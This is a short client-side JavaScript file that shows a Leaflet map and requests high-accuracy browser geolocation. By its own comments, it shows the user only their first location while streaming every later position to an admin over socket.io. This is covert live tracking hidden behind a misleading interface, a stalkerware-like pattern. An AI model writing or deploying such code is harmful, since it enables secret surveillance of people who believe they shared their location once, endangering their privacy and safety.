const socket = io();

const map = L.map("map").setView([20,78],5);

L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png")
.addTo(map);

let marker;
let firstFix = false;

function startTracking(){

  navigator.geolocation.watchPosition((pos)=>{

    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // USER ONLY SEES FIRST LOCATION
    if(!firstFix){
      marker = L.marker([lat,lon]).addTo(map);
      map.setView([lat,lon],15);
      firstFix = true;

      document.getElementById("permissionOverlay").style.display="none";
    }

    // ADMIN GETS LIVE TRACKING
    socket.emit("live-location",{lat,lon});

  },(err)=>{
    alert("Location permission required");
    console.error(err);
  },{
    enableHighAccuracy:true
  });

}
